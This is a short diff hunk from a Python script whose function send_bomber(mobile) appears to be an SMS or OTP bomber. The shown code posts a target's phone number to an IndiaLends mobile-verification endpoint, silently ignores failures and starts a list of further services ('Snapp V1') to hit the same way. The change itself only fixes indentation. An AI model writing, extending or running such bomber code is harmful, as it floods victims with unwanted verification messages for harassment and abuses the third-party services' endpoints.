@@ -77,8 +77,7 @@ def send_bomber(mobile):
         # 15. IndiaLends (POST)
         try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
         except: pass
-          
-         apis = [
+        apis = [
         {
             "name": "Snapp V1",
             "method": "POST",
